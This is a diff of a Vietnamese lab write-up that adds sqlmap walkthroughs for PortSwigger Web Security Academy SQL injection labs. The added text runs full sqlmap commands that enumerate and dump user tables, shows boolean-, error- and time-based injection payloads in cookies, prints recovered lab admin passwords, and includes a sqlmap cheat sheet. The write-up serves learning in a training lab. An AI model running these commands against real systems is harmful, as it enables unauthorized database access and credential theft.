@@ -386,6 +386,14 @@ mình quét file này với lệnh
 sqlmap -r sqlmap.txt --batch --threads=5 --level=5 --risk=3
 ```
 
+hoặc mình có thể chuyển đổi sang method get và chạy trực tiếp
+
+![ảnh](https://hackmd.io/_uploads/HkxVP5ShT.png)
+
+```!
+sqlmap -u "https://0a89002b043d719f826fabab00ff00b7.web-security-academy.net/login?csrf=X4iKC4ZlXkrkGlAJRHJSkWEHMknLb115&username=administrator&password=peteer" --batch
+```
+
 ## 3. Lab: SQL injection UNION attack, determining the number of columns returned by the query
 
 link: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
@@ -822,7 +830,7 @@ mục đích của chúng ta đã hoàn thành và mình đã giải quyết đ�
 
 ![image](https://hackmd.io/_uploads/HyGHt_n9a.png)
 
-### SQL
+### SQLMAP
 
 - mình đã làm lại bài này với sqlmap
 - tương tự bài trên mình dùng lệnh sau để xem version của database
@@ -935,6 +943,55 @@ print(soup)
 mục đích của chúng ta đã hoàn thành và mình đã giải quyết được lab này
 
 ![image](https://hackmd.io/_uploads/BydJZK296.png)
+
+### SQLMAP
+
+- mình đã làm lại bài này với sqlmap
+- đầu tiên mình chạy tấn công mặc định và tìm tên database có trong cơ sở dữ liệu bằng lệnh
+
+```sql!
+sqlmap -u https://0aab000904533546845efe8600ce00bb.web-security-academy.net/filter?category=Lifestyle  --batch --dbs
+```
+
+và mình được database tên **public**
+
+![ảnh](https://hackmd.io/_uploads/BJR__5Sha.png)
+
+cùng với đó biết được lab dùng CSDL PostgreSQL và có thể tấn công bằng UNION query
+
+![ảnh](https://hackmd.io/_uploads/H1LmFcH36.png)
+
+- mình tiếp tục liệt kê các bảng trong database này bằng lệnh
+
+```sql!
+sqlmap -u https://0aab000904533546845efe8600ce00bb.web-security-academy.net/filter?category=Lifestyle  --batch -D public --tables
+```
+
+và mình được 2 bảng
+
+![ảnh](https://hackmd.io/_uploads/HJZzY5Hn6.png)
+
+mục đích của bài là lấy được password của administrator nên mình vào table **users** và xem cấu trúc của bange này bằng lệnh
+
+```sql!
+sqlmap -u https://0aab000904533546845efe8600ce00bb.web-security-academy.net/filter?category=Lifestyle  --batch -D public -T users --columns
+```
+
+![ảnh](https://hackmd.io/_uploads/SJzfqcS3T.png)
+
+trong table users có lưu email, password và username và mình sẽ dump nó để đọc thông tin của bảng này với lệnh
+
+```sql!
+sqlmap -u https://0aab000904533546845efe8600ce00bb.web-security-academy.net/filter?category=Lifestyle  --batch -D public -T users --dump
+```
+
+và mình được mật khẩu của admin là **n2rms4i02ubss50z23y7**
+
+![ảnh](https://hackmd.io/_uploads/HkXs95Hna.png)
+
+đem đi đăng nhập và mình solve được lab này
+
+![ảnh](https://hackmd.io/_uploads/S1jJsqSha.png)
 
 ## 8. Lab: SQL injection attack, listing the database contents on non-Oracle databases
 
@@ -1121,6 +1178,73 @@ mục đích của chúng ta đã hoàn thành và mình đã giải quyết đ�
 
 ![image](https://hackmd.io/_uploads/SkCTz6n56.png)
 
+### SQLMAP
+
+- mình đã làm lại bài này với sqlmap
+- đầu tiên mình chạy tấn công mặc định và tìm tên database có trong cơ sở dữ liệu bằng lệnh
+
+```sql!
+sqlmap -u https://0aab000904533546845efe8600ce00bb.web-security-academy.net/filter?category=Lifestyle  --batch --dbs
+```
+
+- mình được 3 database **public**, **pg_catalog**
+  và **information_schema**
+
+![ảnh](https://hackmd.io/_uploads/ByQMh9B2T.png)
+
+cùng với đó biết được lab dùng CSDL PostgreSQL và có thể tấn công bằng UNION query
+
+![ảnh](https://hackmd.io/_uploads/r1WZn5Hhp.png)
+
+- mình thấy những bài trước username và password được lưu ơr database public nên mình vào database này và xem các bảng bằng lệnh
+
+```sql!
+sqlmap -u https://0a46002c040595ed808f8a72003400c3.web-security-academy.net/filter?category=Accessories  --batch -D public --tables
+```
+
+![ảnh](https://hackmd.io/_uploads/S1arpcBnp.png)
+
+- mình được 2 bảng trong đó có **users_ztmdbv**
+- mình vào bảng này và thử xem các cột có trường password không bằng lệnh
+
+```sql!
+sqlmap -u https://0a46002c040595ed808f8a72003400c3.web-security-academy.net/filter?category=Accessories  --batch -D public -T users_ztmdbv --columns
+```
+
+và mình thấy có cột **password_xrknpd**
+
+![ảnh](https://hackmd.io/_uploads/rJ2g05ShT.png)
+
+tiếp theo mình dump bảng này ra và đọc thông tin bằng lệnh
+
+```sql!
+sqlmap -u https://0a46002c040595ed808f8a72003400c3.web-security-academy.net/filter?category=Accessories  --batch -D public -T users_ztmdbv --dump
+```
+
+![ảnh](https://hackmd.io/_uploads/H1oSCqr2T.png)
+
+mình được password của admin là **2y5kk21figif1nh15wdq**
+
+- đem đi đăng nhập và mình solve được lab này
+
+![ảnh](https://hackmd.io/_uploads/SyOsAcrha.png)
+
+mình xem các bảng trong 2 database còn lại còn lại
+
+```sql!
+sqlmap -u https://0a46002c040595ed808f8a72003400c3.web-security-academy.net/filter?category=Accessories  --batch -D pg_catalog --tables
+```
+
+![ảnh](https://hackmd.io/_uploads/B1KnJjr3T.png)
+
+```sql!
+sqlmap -u https://0a46002c040595ed808f8a72003400c3.web-security-academy.net/filter?category=Accessories  --batch -D information_schema --tables
+```
+
+![ảnh](https://hackmd.io/_uploads/r15xxirn6.png)
+
+- và mình có thể xem cũng như lưu dữ liệu từ các database này
+
 ## 9. Lab: SQL injection attack, listing the database contents on Oracle
 
 link: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle
@@ -1264,6 +1388,67 @@ mục đích của chúng ta đã hoàn thành và mình đã giải quyết đ�
 
 ![image](https://hackmd.io/_uploads/B1HYqpn9a.png)
 
+### SQLMAP
+
+- mình đã làm lại bài này với sqlmap
+- đầu tiên mình chạy tấn công mặc định và tìm tên database có trong cơ sở dữ liệu bằng lệnh
+
+```sql!
+sqlmap -u https://0a4c00480391416d861fc53400890015.web-security-academy.net/filter?category=Gifts  --batch --dbs
+```
+
+![ảnh](https://hackmd.io/_uploads/BJY8eAH26.png)
+
+- tấn công với chế độ mặc định --batch khá lâu và sqlmap gợi ý mình chạy với option --threads vì mình đang chạy single-thread
+- sqlmap cho biết CSDL ở đây là Oracle nên mình chỉ loại CSDL luôn cho sqlmap là --dbms=Oracle
+- cùng với đó mình chỉnh từ chế độ tấn công default "BEUSTQ" trên sqlmap sang --technique=U là kiểu tấn công UNION với lệnh sau
+
+```sql!
+sqlmap -u https://0a4c00480391416d861fc53400890015.web-security-academy.net/filter?category=Gifts  --batch --dbms=Oracle  -dbs --threads=10 --technique=U
+```
+
+![ảnh](https://hackmd.io/_uploads/B1LkGAS3p.png)
+
+- và mình sqlmap có thể tấn công UNION
+
+![ảnh](https://hackmd.io/_uploads/H1JDb0ShT.png)
+
+- cùng với đó mình được 7 database
+
+- mình vào từng database và xem các tables cho đến database **PETER** và nó là database mình cần tìm
+
+```sql!
+sqlmap -u https://0a4c00480391416d861fc53400890015.web-security-academy.net/filter?category=Gifts  --batch --dbms=Oracle  -D PETER --tables
+```
+
+![ảnh](https://hackmd.io/_uploads/B1XzNCS3p.png)
+
+mình thấy có table **USERS_VPHRXN** có thể chứa các users
+
+- để kiểm tra mình xem các cột của bảng này bằng lệnh
+
+```sql!
+sqlmap -u https://0a4c00480391416d861fc53400890015.web-security-academy.net/filter?category=Gifts  --batch --dbms=Oracle  -D PETER -T USERS_VPHRXN --columns
+```
+
+![ảnh](https://hackmd.io/_uploads/SJTq4CHnp.png)
+
+và mình thấy có username và password
+
+- mình dump ra thông tin của bảng này bằng lệnh
+
+```sql!
+sqlmap -u https://0a4c00480391416d861fc53400890015.web-security-academy.net/filter?category=Gifts  --batch --dbms=Oracle  -D PETER -T USERS_VPHRXN --dump
+```
+
+![ảnh](https://hackmd.io/_uploads/Hy21HASh6.png)
+
+và mình được mật khẩu của admin là **jvabuznksyj30h0zg1ey**
+
+- đem đi dăng nhập và mình solve được lab này
+
+![ảnh](https://hackmd.io/_uploads/rkp4BRSh6.png)
+
 ## 10. Lab: SQL injection UNION attack, retrieving multiple values in a single column
 
 link: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
@@ -1364,6 +1549,57 @@ mục đích của chúng ta đã hoàn thành và mình đã giải quyết đ�
 
 ![image](https://hackmd.io/_uploads/HyvbUkpcT.png)
 
+### SQLMAP
+
+- mình đã làm lại bài này với sqlmap
+- đầu tiên mình chạy tấn công mặc định và tìm tên database có trong cơ sở dữ liệu bằng lệnh
+
+```sql!
+sqlmap -u https://0a680001038bc2a3848eb5d5009f00db.web-security-academy.net/filter?category=Lifestyle  --batch --dbs
+```
+
+- mình được database **public**
+
+![ảnh](https://hackmd.io/_uploads/r1eaLCrha.png)
+
+cùng với đó biết được lab dùng CSDL PostgreSQL và có thể tấn công bằng UNION query
+
+![ảnh](https://hackmd.io/_uploads/H1i080S3T.png)
+
+- mình thấy những bài trước username và password được lưu ở database public nên mình vào database này và xem các bảng bằng lệnh
+
+```sql!
+sqlmap -u https://0a680001038bc2a3848eb5d5009f00db.web-security-academy.net/filter?category=Lifestyle  --batch -D public --tables
+
+```
+
+![ảnh](https://hackmd.io/_uploads/H1UHw0Bha.png)
+
+- mình được 2 bảng trong đó có **users**
+- mình vào bảng này và thử xem các cột có trường password không bằng lệnh
+
+```sql!
+sqlmap -u https://0a680001038bc2a3848eb5d5009f00db.web-security-academy.net/filter?category=Lifestyle  --batch -D public -T users --columns
+```
+
+và mình thấy có cột **password**
+
+![ảnh](https://hackmd.io/_uploads/rkyqvRBn6.png)
+
+tiếp theo mình dump bảng này ra và đọc thông tin bằng lệnh
+
+```sql!
+sqlmap -u https://0a680001038bc2a3848eb5d5009f00db.web-security-academy.net/filter?category=Lifestyle  --batch -D public -T users --dump
+```
+
+![ảnh](https://hackmd.io/_uploads/r11avRS26.png)
+
+mình được password của admin là **vqusjmqjv6jtctl3o5bo**
+
+- đem đi đăng nhập và mình solve được lab này
+
+![ảnh](https://hackmd.io/_uploads/SkJMOCr36.png)
+
 ## 11. Lab: Blind SQL injection with conditional responses
 
 link: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
@@ -1442,6 +1678,78 @@ Khi đó ta có tài khoản **`administrator:oeaor9jnzxye3u0shjdv`** và đăng
 
 ![image](https://hackmd.io/_uploads/HJ4MdMTc6.png)
 
+### SQLMAP
+
+- mình đã làm lại bài này với sqlmap
+- đầu tiên mình chạy tấn công mặc định và tìm tên database có trong cơ sở dữ liệu bằng lệnh
+
+```sql!
+sqlmap -u https://0a9f00940340be4885b38a3300190019.web-security-academy.net/filter?category=Lifestyle  --batch --threads=10
+```
+
+![ảnh](https://hackmd.io/_uploads/H1JZhCrna.png)
+
+và sqlmap thông baos parameter category không thể inject được và mình đã chuyển hướng tấn công qua cookies là trường còn lại mà mình có thể kiểm soát bằng lệnh
+
+![ảnh](https://hackmd.io/_uploads/B1voC0rhp.png)
+
+```sql!
+sqlmap  -u "https://0a9f00940340be4885b38a3300190019.web-security-academy.net/" --cookie "TrackingId=CriZQLZY2rgTxcbl*; session=5OGR8fOXIsNONwfauv6Gsz5j0NHX8Z" --technique=B --threads=10 --batch
+```
+
+sqlmap sẽ inject vào ký tự **"\*"** với kiểu tấn công mình chọn là Blind
+
+![ảnh](https://hackmd.io/_uploads/r1zV1yUn6.png)
+
+sqlmap thông báo có thể inject vào cookie với -string="Welcome back!"
+
+- và CSDL ở đây dùng là **PostgreSQL**
+- cùng với đó mình có thể tấn công theo kiểu **boolean-based blind** với Payload: `TrackingId=CriZQLZY2rgTxcbl' AND 3593=3593 AND 'MmVS'='MmVS; session=5OGR8fOXIsNONwfauv6Gsz5j0NHX8Z`
+
+tiếp theo mình liệt kê database sử dụng trong CSDL này bằng lệnh
+
+```sql!
+sqlmap  -u "https://0a9f00940340be4885b38a3300190019.web-security-academy.net/" --cookie "TrackingId=CriZQLZY2rgTxcbl*; session=5OGR8fOXIsNONwfauv6Gsz5j0NHX8Z" --technique=B --threads=10 --dbs  --batch
+```
+
+![ảnh](https://hackmd.io/_uploads/HJIBlyI2T.png)
+
+- mình được 3 database **public**, **pg_catalog**
+  và **information_schema**
+
+- mình thấy những bài trước username và password được lưu ơr database public nên mình vào database này và xem các bảng bằng lệnh
+
+```sql!
+sqlmap  -u "https://0a9f00940340be4885b38a3300190019.web-security-academy.net/" --cookie "TrackingId=CriZQLZY2rgTxcbl*; session=5OGR8fOXIsNONwfauv6Gsz5j0NHX8Z" --technique=B --threads=10 -D public --tables   --batch
+```
+
+![ảnh](https://hackmd.io/_uploads/Sk47-y82T.png)
+
+- mình được 2 bảng trong đó có table users
+
+mình liệt kê các cột trong table này xem có cột password không bằng lệnh
+
+```sql!
+sqlmap  -u "https://0a9f00940340be4885b38a3300190019.web-security-academy.net/" --cookie "TrackingId=CriZQLZY2rgTxcbl*; session=5OGR8fOXIsNONwfauv6Gsz5j0NHX8Z" --technique=B --threads=10 -D public -T users --columns    --batch
+```
+
+![ảnh](https://hackmd.io/_uploads/ry7yGyInT.png)
+
+- có thông tin chúng ta cần mình dump bảng này ra bằng lệnh
+
+```sql!
+sqlmap  -u "https://0a9f00940340be4885b38a3300190019.web-security-academy.net/" --cookie "TrackingId=CriZQLZY2rgTxcbl*; session=5OGR8fOXIsNONwfauv6Gsz5j0NHX8Z" --technique=B --threads=10 -D public -T users --dump --batch
+```
+
+![ảnh](https://hackmd.io/_uploads/Hy-jM1U2p.png)
+
+- và mình được password của admin là **9l94sbklfpb3wthbet9k**
+- mình đem đi đăng nhập và solve được lab này
+
+![ảnh](https://hackmd.io/_uploads/Skb1QkInT.png)
+
+- phải nói dùng SQLMAP khá tiện và nhanh so với cách trên mình làm phải đợi hơn 2h để burp suite dò ra mật khẩu của admin
+
 ## 12. Lab: Blind SQL injection with conditional errors
 
 link: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
@@ -1511,6 +1819,62 @@ Khi đó ta có tài khoản **`administrator:bnzw5hf3nhqa7dg5swd2`** và đăng
 
 ![image](https://hackmd.io/_uploads/H1xiW1CqT.png)
 
+### SQLMAP
+
+- mình đã làm lại bài này với sqlmap
+- tương tự bài trên mình dùng lệnh sau để quét
+
+```sql!
+sqlmap  -u "https://0a3f00e103d9e2fb801e03dd00ca00f7.web-security-academy.net/" --cookie "TrackingId=jfOiVh13j5cygBd0*; session=gkuJg9Xov2XlVeuSAQK4CcDRCCjAk1" --technique=B --threads=10  --batch
+```
+
+![ảnh](https://hackmd.io/_uploads/Skjo5y82a.png)
+
+nhưng sqlmap không thể detect ra boolean-base ở thông báo lỗi trả về trên http
+
+- nên mình dùng lệnh sau để nâng số payload lên và quét chi tiết hơn
+
+```sql!
+sqlmap  -u "https://0a3f00e103d9e2fb801e03dd00ca00f7.web-security-academy.net/" --cookie "TrackingId=jfOiVh13j5cygBd0*; session=gkuJg9Xov2XlVeuSAQK4CcDRCCjAk1" --dbms=Oracle --technique=B --threads=10 --risk=3 --level=5 --batch
+```
+
+![ảnh](https://hackmd.io/_uploads/rJKFKyUna.png)
+
+và sqlmap hiểu được boolean-base tại **--code=200** với Payload: `TrackingId=jfOiVh13j5cygBd0' AND (SELECT (CASE WHEN (2179=2179) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,2179) END) FROM DUAL) IS NULL-- wIeK; session=gkuJg9Xov2XlVeuSAQK4CcDRCCjAk1` trên CSDL Oracle
+
+tiếp theo mình dùng lệnh sau để liệt kê ra các database được dùng trong bài này
+
+```sql!
+sqlmap  -u "https://0a3f00e103d9e2fb801e03dd00ca00f7.web-security-academy.net/" --cookie "TrackingId=jfOiVh13j5cygBd0*; session=gkuJg9Xov2XlVeuSAQK4CcDRCCjAk1" --dbms=Oracle --technique=B --threads=10 --risk=3 --level=5 --batch --dbs
+```
+
+![ảnh](https://hackmd.io/_uploads/B1NOiyLhT.png)
+
+đang chạy thì bị mất kết nối thật là bất ổn và mình tiếp tục không được cùng với đó trang web bị đơ không load được
+
+- sqlmap đề xuất mình giảm số threads xuống
+
+mình bỏ đi flag --threads và mặc định nó chạy sẽ là 1
+
+```sql!
+sqlmap  -u "https://0a3f00e103d9e2fb801e03dd00ca00f7.web-security-academy.net/" --cookie "TrackingId=jfOiVh13j5cygBd0*; session=gkuJg9Xov2XlVeuSAQK4CcDRCCjAk1" --dbms=Oracle --technique=B  --risk=3 --level=5 --batch --dbs
+```
+
+![ảnh](https://hackmd.io/_uploads/SyCdleIhT.png)
+
+và nó dò tên database khá là lâu nhưng mình thấy có database **AP** và **EX_0400** chưa dò xong và thấy khá quen với 1 bài dùng database Oracle ở trên (9. Lab: SQL injection attack, listing the database contents on Oracle) và mình quay lên bài đó thấy bảng users được lưu trong database **PETER** và thử truy xuất nó bằng lệnh
+
+```sql!
+sqlmap  -u "https://0a3f00e103d9e2fb801e03dd00ca00f7.web-security-academy.net/" --cookie "TrackingId=jfOiVh13j5cygBd0*; session=gkuJg9Xov2XlVeuSAQK4CcDRCCjAk1" --dbms=Oracle --technique=B  --risk=3 --level=5 --batch -D PETER -T  users --dump  --threads=10
+```
+
+![ảnh](https://hackmd.io/_uploads/B1gNblU2p.png)
+
+- thật may nó đã hoạt động và mình có mật khẩu của admin là **awt0xuq33jg04y2hvkun**
+- mình đi đăng nhập và solve được lab này
+
+![ảnh](https://hackmd.io/_uploads/BkKY-xLnp.png)
+
 ## 13. Lab: Blind SQL injection with time delays
 
 link: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays
@@ -1538,6 +1902,37 @@ link: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays
 Cả 3 payload này đều có thể khiến response delay 10s trước khi hiển thị kết quả ta đã solve thành công.
 
 ![image](https://hackmd.io/_uploads/HJdLxATcp.png)
+
+### SQLMAP
+
+- mình đã làm lại bài này với sqlmap
+- mình dùng lệnh sau để tấn công mặc định với sqlmap
+
+```sql!
+sqlmap  -u "https://0a3000f303d5e6ea80a8e48800d1001d.web-security-academy.net/filter?category=Pets"  --batch
+```
+
+![ảnh](https://hackmd.io/_uploads/BJ7B6fUnp.png)
+
+và sqlmap thông báo parameter category có thể ko bị injection và mình chuyển hướng sang trường cookie chúng ta có thể kiểm soát bằng lệnh
+
+```sql!
+sqlmap  -u "https://0a3000f303d5e6ea80a8e48800d1001d.web-security-academy.net/" --cookie "TrackingId=qSyWsQwsSq66c7DU*; session=8DwrlFLfWdx3WhavBPhQbEEX8LifAo" --batch
+```
+
+![ảnh](https://hackmd.io/_uploads/r1A_Cz8ha.png)
+
+- mình được CSDL ở đây là PostgreSQL và mình có thể tấn công stacked queries và thực hiện time-base injection với Payload: `TrackingId=qSyWsQwsSq66c7DU';SELECT PG_SLEEP(5)--; session=8DwrlFLfWdx3WhavBPhQbEEX8LifAo`
+
+đề bài yêu cầu mình làm trễ 10 giậy nên mình sẽ dùng `;SELECT PG_SLEEP(10)--`
+
+gửi nó
+
+![ảnh](https://hackmd.io/_uploads/HyoOg7Inp.png)
+
+và mình solve được lab này
+
+![ảnh](https://hackmd.io/_uploads/r1R5xQ82T.png)
 
 ## 14. Lab: Blind SQL injection with time delays and information retrieval
 
@@ -1584,6 +1979,48 @@ Giờ ta sẽ tiến hành lấy từng ký tự của mật khẩu bằng paylo
 
 Khi đó ta có tài khoản **`administrator:jhei5dcbd4selcifhb59`** và đăng nhập để solve challenge.
 
+### SQLMAP
+
+- mình đã làm lại bài này với sqlmap
+- đầu tiên mình tấn công time-base vào Trackingid để tìm các database được dùng trong bài này với lệnh
+
+```sql!
+sqlmap  -u "https://0aa6001403ccba888414dc7a0061001a.web-security-academy.net/" --cookie "TrackingId=pcSy1Ri7YCMxmJVK*; session=0dNnfgTga9vjmLkaD1y3ZQIDrkD1OM" --dbms=PostgreSQL --technique=T  --risk=3 --level=5 --threads=10 --batch --dbs
+```
+
+![ảnh](https://hackmd.io/_uploads/S1ERf7U3a.png)
+
+- và mình được database **public**
+- tiếp đó mình liệt kê các tables trong database này bằng lệnh
+
+```sql!
+sqlmap  -u "https://0aa6001403ccba888414dc7a0061001a.web-security-academy.net/" --cookie "TrackingId=pcSy1Ri7YCMxmJVK*; session=0dNnfgTga9vjmLkaD1y3ZQIDrkD1OM" --dbms=PostgreSQL --technique=T  --risk=3 --level=5 --threads=10 --batch -D public --tables
+```
+
+![ảnh](https://hackmd.io/_uploads/Sks74QL36.png)
+
+và mình được 2 tables trong đó có table users
+
+- mình dump table này ra xem bằng lệnh
+
+```sql!
+sqlmap  -u "https://0aa6001403ccba888414dc7a0061001a.web-security-academy.net/" --cookie "TrackingId=pcSy1Ri7YCMxmJVK*; session=0dNnfgTga9vjmLkaD1y3ZQIDrkD1OM" --dbms=PostgreSQL --technique=T  --risk=3 --level=5 --threads=10 --batch -D public -T users --dump
+```
+
+- do trờ gen ra toàn bộ bảng khá lâu nên sqlmap tìm được pass của admin là mình submit luôn
+
+![ảnh](https://hackmd.io/_uploads/rkE5Om82T.png)
+
+![ảnh](https://hackmd.io/_uploads/SyE6imU2a.png)
+
+và mình đi đăng nhập với tài khoản **administrator:qs8naxzrzqlhokqomwv9** và solve được lab này
+
+![ảnh](https://hackmd.io/_uploads/rJEFim83p.png)
+
+- đợi đến cuối mình được bảng
+
+![ảnh](https://hackmd.io/_uploads/H14lzE8hT.png)
+
 ## 15. Lab: SQL injection with filter bypass via XML encoding
 
 link: https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding
@@ -1601,7 +2038,7 @@ link: https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-
 
 ### Khai thác
 
-- mình không thể tấn công theo cách bình thường như này, nên em cần phải sử dụng thêm extension có trong BurpSuite là Hackvertor, công cụ này sẽ biến đổi payload và mã hóa theo nhiều dạng khác nhau, tiêu biểu như: base64,… Ở đây em sẽ encode câu query của mình theo dạng hex_entities để vượt qua được tường lửa của trang web:
+- mình không thể tấn công theo cách bình thường như này, nên mình cần phải sử dụng thêm extension có trong BurpSuite là Hackvertor, công cụ này sẽ biến đổi payload và mã hóa theo nhiều dạng khác nhau, tiêu biểu như: base64,… Ở đây em sẽ encode câu query của mình theo dạng hex_entities để vượt qua được tường lửa của trang web:
 
 ![image](https://hackmd.io/_uploads/Hk2_EXRc6.png)
 
@@ -1706,7 +2143,77 @@ mục đích của chúng ta đã hoàn thành và mình đã solve được lab
 
 ![image](https://hackmd.io/_uploads/H14y0XC9p.png)
 
-## SQLMAP
+### SQLMAP
+
+- đầu tiên mình liệt kê các database trong lab này với lệnh
+
+```sql!
+sqlmap  -u "https://0a73001803e38b56807d309000da0014.web-security-academy.net/" --cookie "TrackingId=AF9LPLcvwLo3bB3J*; session=BqpZ5ZJTG9g7jXqByGcfWsBu7Vqy02" --technique=BE --dbms=PostgreSQL  --risk=3 --threads=10 --level=5  --batch --dbs
+```
+
+![ảnh](https://hackmd.io/_uploads/S1gevNU2p.png)
+
+- sqlmap ko thể detect
+
+## Cấu trúc lệnh trong SQLMAP
+
+```javascript!
+-u "<URL>"
+-p "<PARAM TO TEST>"
+--user-agent=SQLMAP
+--random-agent
+--threads=10
+--risk=3 #MAX
+--level=5 #MAX
+--dbms="<KNOWN DB TECH>"
+--os="<OS>"
+--technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")
+--batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
+--auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)
+--auth-cred="<AUTH>" #HTTP authentication credentials (name:password)
+--proxy=http://127.0.0.1:8080
+--union-char "GsFRts2" #Help sqlmap identify union SQLi techniques with a weird union char
+```
+
+```java!
+--current-user #Get current user
+--is-dba #Check if current user is Admin
+--hostname #Get hostname
+--users #Get usernames od DB
+--passwords #Get passwords of users in DB
+--privileges #Get privileges
+```
+
+```sql!
+--all #Retrieve everything
+--dump #Dump DBMS database table entries
+--dbs #Names of the available databases
+--tables #Tables of a database ( -D <DB NAME> )
+--columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
+-D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column
+```
+
+### Injections in Headers and other HTTP Methods
+
+```sql!
+#Inside cookie
+sqlmap  -u "http://example.com" --cookie "mycookies=*"
+
+#Inside some header
+sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
+sqlmap -u "http://example.com" --headers="referer:*"
+
+#PUT Method
+sqlmap --method=PUT -u "http://example.com" --headers="referer:*"
+
+#The injection is located at the '*'
+```
+
+### POST Request Injection
+
+```sql!
+sqlmap -u "http://example.com" --data "username=*&password=*"
+```
 
 - Đầu tiên ta chạy thử với dữ liệu nhập vào bình thường, sau đó bắt requests với burpsuite và lưu vào file. Sqlmap có tính năng rất tiện lợi đó là đọc request từ file burp và thực hiện khai thác.
 - VD: `sqlmap -r dum -p id --technique=T`
@@ -1755,3 +2262,4 @@ sqlmap -r dum -p id --technique=T --threads 10 -D <tên database> --dump
 ## Tài liệu tham khảo
 
 - https://whitehat.vn/threads/tim-hieu-ve-sql-injection-va-cach-phong-chong.11591/
+- https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap
